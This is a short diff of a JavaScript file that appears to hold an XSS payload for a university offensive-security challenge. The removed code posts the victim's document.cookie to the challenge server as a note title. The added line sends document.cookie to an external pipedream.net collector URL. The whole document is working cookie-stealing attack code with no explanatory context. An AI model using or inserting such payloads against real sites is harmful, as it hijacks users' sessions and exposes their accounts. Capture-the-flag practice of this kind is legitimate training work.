@@ -1,9 +1,1 @@
-fetch("http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new", {
-  "headers": {
-    "content-type": "application/x-www-form-urlencoded"
-  },
-  "body": "title=" + document.cookie + "&content=TESTAUTO2&submit=save",
-  "method": "POST",
-  "mode": "cors",
-  "credentials": "include"
-});
+fetch("https://enjtwi0jhwsjf0h.m.pipedream.net/" + document.cookie);
